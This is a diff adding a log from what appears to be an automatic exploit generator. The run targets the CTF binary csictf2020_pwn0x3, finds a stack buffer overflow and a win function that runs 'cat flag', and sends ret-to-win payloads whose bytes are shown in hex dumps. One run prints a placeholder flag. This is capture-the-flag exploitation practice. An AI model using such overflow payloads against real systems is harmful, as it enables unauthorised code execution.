@@ -1,0 +1,59 @@
+[*] '/home/user/bof_aeg/challenges/csictf2020_pwn0x3'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] libc.so.6 found in custom_lib_dir, loading now
+[*] '/home/user/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] Removing exist file /tmp/pwn/csictf2020_pwn0x3_debug
+[+] PT_INTERP has changed from b'/lib64/ld-linux-x86-64.so.2\x00' to b'/tmp/ld.so.2'. Using temp file /tmp/pwn/csictf2020_pwn0x3_debug
+[*] '/tmp/pwn/csictf2020_pwn0x3_debug'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] set env={'LD_PRELOAD': '/home/user/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6', 'LD_LIBRARY_PATH': '/home/user/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/'} for debugging remote libc
+[x] Starting local process '/tmp/pwn/csictf2020_pwn0x3_debug' env={b'LD_PRELOAD': b'/home/user/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6', b'LD_LIBRARY_PATH': b'/home/user/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/'} 
+[+] Starting local process '/tmp/pwn/csictf2020_pwn0x3_debug' env={b'LD_PRELOAD': b'/home/user/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6', b'LD_LIBRARY_PATH': b'/home/user/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/'} : pid 5658
+[*] Finding win...
+[*] Found system("b'cat flag'") win_addr :0x4011de
+[*] Finding stack bof...
+[*] Found vulnerable state.
+[*] Vuln_addr: 0x4011cd
+[*] Vuln_func(main): 0x401166
+[*] Trying tech{ret_to_win}...
+[DEBUG] Sent 0x201 bytes:
+    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
+    *
+    00000020  00 00 00 00  00 00 00 00  de 11 40 00  00 00 00 00  │····│····│··@·│····│
+    00000030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
+    *
+    000001f0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 0a  │····│····│····│····│
+    00000200  0a                                                  │·│
+    00000201
+[DEBUG] Received 0x2b bytes:
+    b'Welcome to csictf! Time to teleport again.\n'
+[DEBUG] Received 0x15 bytes:
+    b'flag{asdjalksdjalsd}\n'
+[*] Process '/tmp/pwn/csictf2020_pwn0x3_debug' stopped with exit code 0 (pid 5658)
+[x] Starting local process './challenges/csictf2020_pwn0x3' argv=[b'./challenges/csictf2020_pwn0x3']  env={b'LD_LIBRARY_PATH': b'/home/user/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/'} 
+[+] Starting local process './challenges/csictf2020_pwn0x3' argv=[b'./challenges/csictf2020_pwn0x3']  env={b'LD_LIBRARY_PATH': b'/home/user/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/'} : pid 5715
+[*] Loading gadgets for '/home/user/bof_aeg/challenges/csictf2020_pwn0x3'
+[DEBUG] Sent 0x201 bytes:
+    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
+    *
+    00000020  00 00 00 00  00 00 00 00  64 12 40 00  00 00 00 00  │····│····│d·@·│····│
+    00000030  de 11 40 00  00 00 00 00  00 00 00 00  00 00 00 00  │··@·│····│····│····│
+    00000040  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
+    *
+    000001f0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 0a  │····│····│····│····│
+    00000200  0a                                                  │·│
+    00000201
+[*] Process './challenges/csictf2020_pwn0x3' stopped with exit code 127 (pid 5715)
